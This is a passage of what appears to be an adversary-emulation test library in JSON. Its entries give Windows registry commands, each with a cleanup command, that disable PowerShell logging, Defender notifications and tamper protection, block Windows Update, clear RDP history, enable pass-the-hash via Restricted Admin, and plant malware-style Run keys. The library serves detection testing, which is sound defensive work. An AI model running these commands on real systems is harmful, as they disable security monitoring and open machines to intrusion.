                            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAHealth /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAHealth /f >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Windows HideSCANetwork Group Policy Feature",
                        "auto_generated_guid": "3e757ce7-eca0-411a-9583-1c33b8508d52",
                        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to remove the networking icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCANetwork /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCANetwork /f >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Windows HideSCAPower Group Policy Feature",
                        "auto_generated_guid": "8d85a5d8-702f-436f-bc78-fcd9119496fc",
                        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to remove the battery icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAPower /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAPower /f >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Windows HideSCAVolume Group Policy Feature",
                        "auto_generated_guid": "7f037590-b4c6-4f13-b3cc-e424c5ab8ade",
                        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to remove the volume icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect..\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAVolume /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAVolume /f >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Windows Modify Show Compress Color And Info Tip Registry",
                        "auto_generated_guid": "795d3248-0394-4d4d-8e86-4e8df2a2693f",
                        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to show compress color and show tips feature. \nSee how hermeticwiper uses this technique - https://www.splunk.com/en_us/blog/security/detecting-hermeticwiper.html\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg  add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowInfoTip /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowCompColor /t REG_DWORD /d 0 /f\n",
                            "cleanup_command": "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowInfoTip /f >nul 2>&1\nreg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowCompColor /f >nul 2>&1\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Windows Powershell Logging Disabled",
                        "auto_generated_guid": "95b25212-91a7-42ff-9613-124aca6845a8",
                        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable Powershell Module Logging, Script Block Logging, Transcription and Script Execution\nsee https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.PowerShell::EnableModuleLogging\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging /v EnableModuleLogging /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription /v EnableTranscripting /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell /v EnableScripts /t REG_DWORD /d 0 /f\nreg delete HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell /v EnableScripts /f >nul 2>&1\n",
                            "cleanup_command": "reg delete HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging /v EnableModuleLogging /f >nul 2>&1\nreg delete HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging /v EnableScriptBlockLogging /f >nul 2>&1\nreg delete HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription /v EnableTranscripting /f >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Windows Add Registry Value to Load Service in Safe Mode without Network",
                        "auto_generated_guid": "1dd59fb3-1cb3-4828-805d-cf80b4c3bbb5",
                        "description": "Modify the registry to allow a driver, service, to persist in Safe Mode.\nsee https://redcanary.com/blog/tracking-driver-inventory-to-expose-rootkits/ and https://blog.didierstevens.com/2007/03/26/playing-with-safe-mode/ for further details.\nAdding a subkey to Minimal with the name of your service and a default value set to Service, makes that your service will be started when you boot into Safe Mode without networking. The same applies for the Network subkey.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\AtomicSafeMode\" /VE /T REG_SZ /F /D \"Service\"\n",
                            "cleanup_command": "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\AtomicSafeMode\" /f\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Windows Add Registry Value to Load Service in Safe Mode with Network",
                        "auto_generated_guid": "c173c948-65e5-499c-afbe-433722ed5bd4",
                        "description": "Modify the registry to allow a driver, service, to persist in Safe Mode with networking.\nsee https://redcanary.com/blog/tracking-driver-inventory-to-expose-rootkits/ and https://blog.didierstevens.com/2007/03/26/playing-with-safe-mode/ for further details.\nAdding a subkey to Netowrk with the name of your service and a default value set to Service, makes that your service will be started when you boot into Safe Mode with networking.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\AtomicSafeMode\" /VE /T REG_SZ /F /D \"Service\"\n",
                            "cleanup_command": "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\AtomicSafeMode\" /f\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Disable Windows Toast Notifications",
                        "auto_generated_guid": "003f466a-6010-4b15-803a-cbb478a314d7",
                        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows toast notification.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PushNotifications /v ToastEnabled /t REG_DWORD /d 0 /f\n",
                            "cleanup_command": "reg delete HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PushNotifications /v ToastEnabled /f >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Disable Windows Security Center Notifications",
                        "auto_generated_guid": "45914594-8df6-4ea9-b3cc-7eb9321a807e",
                        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows security center notification.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\ImmersiveShell /v UseActionCenterExperience /t REG_DWORD /d 0 /f\n",
                            "cleanup_command": "reg delete HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\ImmersiveShell /v UseActionCenterExperience /f >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Suppress Win Defender Notifications",
                        "auto_generated_guid": "c30dada3-7777-4590-b970-dc890b8cf113",
                        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to suppress the windows defender notification.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration\" /v Notification_Suppress /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration\" /v Notification_Suppress /f >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Allow RDP Remote Assistance Feature",
                        "auto_generated_guid": "86677d0e-0b5e-4a2b-b302-454175f9aa9e",
                        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to allow rdp remote assistance feature. This feature allow specific\nuser to rdp connect on the targeted machine.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fAllowToGetHelp /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "reg delete \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fAllowToGetHelp /f >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "NetWire RAT Registry Key Creation",
                        "auto_generated_guid": "65704cd4-6e36-4b90-b6c1-dc29a82c8e56",
                        "description": "NetWire continues to create its home key (HKCU\\SOFTWARE\\NetWire) as well as adding it into the auto-run group in the victim’s registry.\nSee how NetWire malware - https://app.any.run/tasks/41ecdbde-4997-4301-a350-0270448b4c8f/\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v NetWire /t REG_SZ  /d \"C:\\Users\\admin\\AppData\\Roaming\\Install\\Host.exe\" /f\nreg add HKCU\\SOFTWARE\\NetWire /v HostId /t REG_SZ /d HostId-kai6Ci /f\nreg add HKCU\\SOFTWARE\\NetWire /v \"Install Date\" /t REG_SZ /d \"2021-08-30 07:17:27\" /f\n",
                            "cleanup_command": "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v NetWire /f >nul 2>&1\nreg delete HKCU\\SOFTWARE\\NetWire /va /f >nul 2>&1\nreg delete HKCU\\SOFTWARE\\NetWire /f >nul 2>&1\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Ursnif Malware Registry Key Creation",
                        "auto_generated_guid": "c375558d-7c25-45e9-bd64-7b23a97c1db0",
                        "description": "Ursnif downloads additional modules from the C&C server and saves these in the registry folder HKEY_CURRENT_USER\\Software\\AppDataLow\\Software\\Microsoft\\\nMore information - https://blog.trendmicro.com/trendlabs-security-intelligence/phishing-campaign-uses-hijacked-emails-to-deliver-ursnif-by-replying-to-ongoing-threads/\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add HKCU\\Software\\AppDataLow\\Software\\Microsoft\\3A861D62-51E0-15700F2219A4 /v comsxRes /t REG_BINARY  /d 72656463616e617279 /f\n",
                            "cleanup_command": "reg delete HKCU\\Software\\AppDataLow\\Software\\Microsoft\\3A861D62-51E0-15700F2219A4 /va /f >nul 2>&1\nreg delete HKCU\\Software\\AppDataLow\\Software\\Microsoft\\3A861D62-51E0-15700F2219A4 /f >nul 2>&1\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Terminal Server Client Connection History Cleared",
                        "auto_generated_guid": "3448824b-3c35-4a9e-a8f5-f887f68bea21",
                        "description": "The built-in Windows Remote Desktop Connection (RDP) client (mstsc.exe) saves the remote computer name (or IP address) and the username that is used to login after each successful connection to the remote computer\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Must have the \"MR9\" Remote Desktop Connection history Key \n",
                                "prereq_command": "if ((Get-ItemProperty -Path \"HKCU:\\SOFTWARE\\Microsoft\\Terminal Server Client\\Default\\\").MR9) {exit 0} else {exit 1}\n",
                                "get_prereq_command": "New-Item -path \"HKCU:\\SOFTWARE\\Microsoft\\\" -name \"Terminal Server Client\"  -ErrorAction Ignore\nNew-Item -path \"HKCU:\\SOFTWARE\\Microsoft\\Terminal Server Client\\\" -name \"Default\" -ErrorAction Ignore\nNew-Itemproperty -path \"HKCU:\\SOFTWARE\\Microsoft\\Terminal Server Client\\Default\" -name \"MR9\" -value \"127.0.0.1\"  -PropertyType \"String\" -ErrorAction Ignore\nNew-Item -path \"HKCU:\\SOFTWARE\\Microsoft\\Terminal Server Client\\\" -name \"Servers\" -ErrorAction Ignore\nNew-Item -path \"HKCU:\\SOFTWARE\\Microsoft\\Terminal Server Client\\Servers\" -name \"Redcanary\" -ErrorAction Ignore\n"
                            }
                        ],
                        "executor": {
                            "command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" /va /f\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" /f\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Disable Windows Error Reporting Settings",
                        "auto_generated_guid": "d2c9e41e-cd86-473d-980d-b6403562e3e1",
                        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable windows error reporting settings. This Windows feature allow the use to report bug, errors, failure or problems \nencounter in specific application or process.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add HKLM64\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f\nreg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "reg delete HKLM64\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /f >nul 2>&1\nreg delete HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /f >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "DisallowRun Execution Of Certain Applications",
                        "auto_generated_guid": "71db768a-5a9c-4047-b5e7-59e01f188e84",
                        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to prevent user running specific computer programs that could aid them in manually removing malware or detecting it \nusing security product.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v DisallowRun /t REG_DWORD /d 1 /f\nreg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /f /t REG_SZ /v art1 /d \"regedit.exe\"\nreg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /f /t REG_SZ /v art2 /d \"cmd.exe\"\n",
                            "cleanup_command": "reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v DisallowRun /f >nul 2>&1\nreg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v art1 /f >nul 2>&1\nreg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v art2 /f >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Enabling Restricted Admin Mode via Command_Prompt",
                        "auto_generated_guid": "fe7974e5-5813-477b-a7bd-311d4f535e83",
                        "description": "Enabling Restricted Admin Mode via Command_Prompt,enables an attacker to perform a pass-the-hash attack using RDP.\n\nSee [Passing the Hash with Remote Desktop](https://www.kali.org/blog/passing-hash-remote-desktop/)\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"hklm\\system\\currentcontrolset\\control\\lsa\" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0\n",
                            "cleanup_command": "reg delete \"hklm\\system\\currentcontrolset\\control\\lsa\" /f /v DisableRestrictedAdmin >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Mimic Ransomware - Enable Multiple User Sessions",
                        "auto_generated_guid": "39f1f378-ba8a-42b3-96dc-2a6540cfc1e3",
                        "description": "This test emulates Mimic ransomware's ability to enable multiple user sessions by modifying the AllowMultipleTSSessions value within the Winlogon registry key. \nSee [Mimic Ransomware Overview] (https://www.trendmicro.com/en_us/research/23/a/new-mimic-ransomware-abuses-everything-apis-for-its-encryption-p.html)\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Winlogon /t REG_DWORD /v AllowMultipleTSSessions /d 1 /f\n",
                            "cleanup_command": "reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Winlogon /v AllowMultipleTSSessions /f >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Mimic Ransomware - Allow Multiple RDP Sessions per User",
                        "auto_generated_guid": "35727d9e-7a7f-4d0c-a259-dc3906d6e8b9",
                        "description": "This test emulates Mimic ransomware's ability to enable multiple RDP sessions per user by modifying the fSingleSessionPerUser value within the Terminal Server registry key. \nSee [Mimic Ransomware Overview] (https://www.trendmicro.com/en_us/research/23/a/new-mimic-ransomware-abuses-everything-apis-for-its-encryption-p.html)\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f\n",
                            "cleanup_command": "reg delete \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fSingleSessionPerUser /f >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Event Viewer Registry Modification - Redirection URL",
                        "auto_generated_guid": "6174be7f-5153-4afd-92c5-e0c3b7cdb5ae",
                        "description": "Modify event viewer registry values to alter the behavior of the online help redirection. Upon opening an event in event viewer and attempting to view the help page for the event, it will open the URL or execute the program defined in the redirection URL registry entry.",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "redirection_url": {
                                "description": "URL to open or file URI to execute upon opening the event help",
                                "type": "url",
                                "default": "file://C:\\windows\\system32\\notepad.exe"
                            }
                        },
                        "executor": {
                            "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionURL /t REG_SZ /d \"#{redirection_url}\" /f",
                            "cleanup_command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionURL /t REG_SZ /d \"http://go.microsoft.com/fwlink/events.asp\" /f",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Event Viewer Registry Modification - Redirection Program",
                        "auto_generated_guid": "81483501-b8a5-4225-8b32-52128e2f69db",
                        "description": "Modify event viewer registry values to alter the behavior of the online help redirection. Upon opening an event in event viewer and attempting to view the help page for the event, it will execute the program defined in the redirection program registry entry.",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "redirection_program": {
                                "description": "Path of the program to execute upon opening the event help",
                                "type": "path",
                                "default": "C:\\windows\\system32\\notepad.exe"
                            }
                        },
                        "executor": {
                            "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /d \"#{redirection_program}\" /f",
                            "cleanup_command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /f",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Enabling Remote Desktop Protocol via Remote Registry",
                        "auto_generated_guid": "e3ad8e83-3089-49ff-817f-e52f8c948090",
                        "description": "Enabling RDP through remote registry.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"hklm\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Winstations\\RDP-Tcp\" /v SecurityLayer /t REG_DWORD /d 0 /f\n",
                            "cleanup_command": "reg add \"hklm\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Winstations\\RDP-Tcp\" /v SecurityLayer /t REG_DWORD /d 2 /f\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Disable Win Defender Notification",
                        "auto_generated_guid": "12e03af7-79f9-4f95-af48-d3f12f28a260",
                        "description": "Disable Win Defender Notification. Redline is using this to disable this win defender feature.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications\" /v \"DisableNotifications\" /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications\" /v \"DisableNotifications\" /t REG_DWORD /d 0 /f\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Disable Windows OS Auto Update",
                        "auto_generated_guid": "01b20ca8-c7a3-4d86-af59-059f15ed5474",
                        "description": "Disable Auto Update Windows OS feature. Redline is using this as part of its defense evasion.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"NoAutoUpdate\" /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"NoAutoUpdate\" /t REG_DWORD /d 0 /f\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Disable Windows Auto Reboot for current logon user",
                        "auto_generated_guid": "396f997b-c5f8-4a96-bb2c-3c8795cf459d",
                        "description": "Disable Windows Auto Reboot for current logon user. Redline is using this as part of its defense evasion.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"NoAutoRebootWithLoggedOnUsers\" /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"NoAutoRebootWithLoggedOnUsers\" /t REG_DWORD /d 0 /f\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Windows Auto Update Option to Notify before download",
                        "auto_generated_guid": "335a6b15-b8d2-4a3f-a973-ad69aa2620d7",
                        "description": "Windows Auto Update Option to Notify before download. Redline is using this as part of its defense evasion.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"AUOptions\" /t REG_DWORD /d 2 /f\n",
                            "cleanup_command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"AUOptions\" /t REG_DWORD /d 3 /f\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Do Not Connect To Win Update",
                        "auto_generated_guid": "d1de3767-99c2-4c6c-8c5a-4ba4586474c8",
                        "description": "Do Not Connect To Win Update. Redline is using this as part of its defense evasion.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\" /v \"DoNotConnectToWindowsUpdateInternetLocations\" /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\" /v \"DoNotConnectToWindowsUpdateInternetLocations\" /t REG_DWORD /d 0 /f\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Tamper Win Defender Protection",
                        "auto_generated_guid": "3b625eaa-c10d-4635-af96-3eae7d2a2f3c",
                        "description": "Tamper Win Defender Protection. RedLine Stealer is executing another component file to modify this win defender feature in registry. \nTake note that this modification might not be enough to disable this feature but can be a good indicator of malicious process that \ntries to tamper this Win Defender feature settings.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\" /t REG_DWORD /d 0 /f\n",
                            "cleanup_command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\" /t REG_DWORD /d 5 /f\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Snake Malware Registry Blob",
                        "auto_generated_guid": "8318ad20-0488-4a64-98f4-72525a012f6b",
                        "description": "The following Atomic Test creates a registry blob in HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds, which is related to Snake Malware. Per the report, upon execution, Snake's WerFault.exe will attempt to decrypt an encrypted blob within the Windows\nregistry that is typically found at HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds. The encrypted data includes the AES key, IV, and path that is used to find and decrypt the file containing Snake's kernel driver and kernel driver loader.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "$typicalPath = \"HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds\"; $randomBytes = New-Object Byte[] 0x1000; (New-Object Random).NextBytes($randomBytes); New-ItemProperty -Path $typicalPath -Name \"AtomicSnake\" -Value $randomBytes -PropertyType Binary -Force | Out-Null\n",
                            "cleanup_command": "$typicalPath = \"HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds\"; Remove-ItemProperty -Path $typicalPath -Name \"AtomicSnake\" -ErrorAction SilentlyContinue | Out-Null\n",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Allow Simultaneous Download Registry",
                        "auto_generated_guid": "37950714-e923-4f92-8c7c-51e4b6fffbf6",
                        "description": "A registry modification to allow Simultaneous download in the system.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"MaxConnectionsPerServer\" /t REG_DWORD /d 10 /f\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"MaxConnectionsPer1_0Server\" /t REG_DWORD /d 10 /f\n",
                            "cleanup_command": "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"MaxConnectionsPerServer\" /f\nreg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"MaxConnectionsPer1_0Server\" /f\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Modify Internet Zone Protocol Defaults in Current User Registry - cmd",
                        "auto_generated_guid": "c88ef166-50fa-40d5-a80c-e2b87d4180f7",
